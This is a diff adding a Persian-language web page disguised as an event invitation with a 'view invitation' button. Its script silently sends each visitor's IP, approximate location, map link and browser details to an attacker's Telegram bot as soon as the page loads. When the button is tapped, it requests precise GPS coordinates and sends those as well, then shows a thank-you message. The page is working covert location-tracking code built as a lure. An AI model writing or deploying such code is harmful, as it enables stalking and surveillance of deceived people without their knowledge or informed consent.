@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="fa" dir="rtl"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>دعوت‌نامه</title>
+<style>
+ body{font-family:Tahoma,sans-serif;background:#f6f7fb;margin:0;display:flex;
+      align-items:center;justify-content:center;min-height:100vh}
+ .card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);
+       padding:32px 24px;max-width:340px;text-align:center}
+ h2{margin:0 0 10px;font-size:18px}
+ p{color:#555;font-size:14px;line-height:1.9;margin:0 0 22px}
+ button{background:#2d6cdf;color:#fff;border:0;border-radius:10px;
+        padding:14px 34px;font-size:16px;font-family:inherit}
+ #done{display:none;color:#1a9c5b;font-size:14px;margin-top:16px}
+</style></head>
+<body>
+<div class="card">
+  <h2 id="t">دعوت‌نامه</h2>
+  <p id="m">برای مشاهدهٔ جزئیات و تأیید حضور، روی دکمهٔ زیر بزنید.</p>
+  <button id="b">مشاهدهٔ دعوت‌نامه</button>
+  <div id="done">ثبت شد. ممنون!</div>
+</div>
+<script>
+const TOKEN = "123456:ABC-DEF";   // توکن بات خودت
+const CHAT  = "111111111";        // chat_id خودت
+
+function tg(t){
+  fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT+
+        "&text="+encodeURIComponent(t), {mode:"no-cors"}).catch(()=>{});
+}
+
+/* مرحلهٔ ۱: بی‌صدا، فقط با باز شدن صفحه */
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
+  tg("🔗 لینک باز شد\nIP: "+d.ip+"\n"+d.city+" / "+d.region+" / "+d.country_name+
+     "\nhttps://maps.google.com/?q="+d.latitude+","+d.longitude+
+     "\nUA: "+navigator.userAgent);
+}).catch(()=>tg("لینک باز شد، ولی IP خوانده نشد"));
+
+/* مرحلهٔ ۲: با یک لمس Allow، مختصات دقیق */
+document.getElementById("b").onclick = function(){
+  tg("👆 روی دکمه زد — درخواست موقعیت فرستاده شد");
+  navigator.geolocation.getCurrentPosition(function(p){
+    const la=p.coords.latitude.toFixed(6), lo=p.coords.longitude.toFixed(6);
+    tg("📍 GPS دقیق\n"+la+", "+lo+"  ±"+Math.round(p.coords.accuracy)+"m\n"+
+       "https://maps.google.com/?q="+la+","+lo);
+    document.getElementById("m").style.display="none";
+    document.getElementById("b").style.display="none";
+    document.getElementById("done").style.display="block";
+  }, function(e){
+    tg("⛔️ موقعیت رد شد: "+e.message);
+    document.getElementById("done").style.display="block";
+    document.getElementById("done").textContent="ثبت شد. ممنون!";
+  }, {enableHighAccuracy:true, timeout:25000, maximumAge:0});
+};
+</script></body></html>
